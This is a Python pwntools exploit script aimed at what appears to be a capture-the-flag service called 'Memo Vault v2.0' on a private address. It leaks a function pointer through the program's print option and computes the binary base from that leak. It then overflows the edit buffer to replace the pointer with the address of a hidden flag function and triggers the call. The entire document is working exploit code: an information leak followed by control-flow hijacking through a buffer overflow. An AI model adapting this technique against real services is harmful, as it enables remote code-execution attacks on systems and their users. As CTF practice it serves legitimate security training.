
from pwn import *

# Connection
HOST, PORT = "10.1.2.228", 31337
context.clear(arch="amd64", os="linux")
context.log_level = "info"

# Offsets (relative to binary base)
OFF_NORMAL     = 0x11BC  # normal_print @ 0x4011BC
OFF_VAULT_FLAG = 0x1196  # vault_flag   @ 0x401196

def menu_choice(io, n):
    io.recvuntil(b"> ")
    io.sendline(str(n).encode())

def do_create(io, data=b"A"*0x100):
    menu_choice(io, 1)
    io.recvuntil(b"Content: ")
    io.send(data)
    io.recvuntil(b"Created!")

def do_print(io, idx=0):
    menu_choice(io, 3)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    line = io.recvline()  # "calling %p...\n"
    return line

def do_edit(io, idx, new_ptr_addr, fill=b"B"*0x100):
    menu_choice(io, 2)
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"New content: ")
    payload = fill + p64(new_ptr_addr) + b"C"*(0x110 - len(fill) - 8)
    io.send(payload)
    io.recvuntil(b"Updated!")

def main():
    io = remote(HOST, PORT)
    io.recvuntil(b"== Memo Vault v2.0 ==")

    # 1) Create memo 0
    do_create(io)

    # 2) Leak current function pointer via print(0)
    leak_line = do_print(io, 0)
    # Example: b"calling 0x4011bc...\n"  OR PIE like b"calling 0x55b3c8b1d1bc...\n"
    try:
        leaked = int(leak_line.strip().split()[-1].rstrip(b"...").rstrip(b")").lstrip(b"("), 16)
    except:
        # fallback parse: last token contains the address
        leaked = int(leak_line.decode().split()[-1].strip(".\n)"), 16)

    # Compute base using normal_print offset
    base = leaked - OFF_NORMAL
    log.success(f"Leaked func ptr: {hex(leaked)}  => base: {hex(base)}")

    # 3) Overwrite ptr at +0x100 with vault_flag
    vault_addr = base + OFF_VAULT_FLAG
    log.info(f"Overwriting function pointer with vault_flag @ {hex(vault_addr)}")
    do_edit(io, 0, vault_addr)

    # 4) Trigger
    log.info("Triggering vault_flag via print(0)")
    menu_choice(io, 3)
    io.recvuntil(b"Index: ")
    io.sendline(b"0")

    # Should print flag and exit; keep interactive just in case
    io.interactive()

if __name__ == "__main__":
    main()
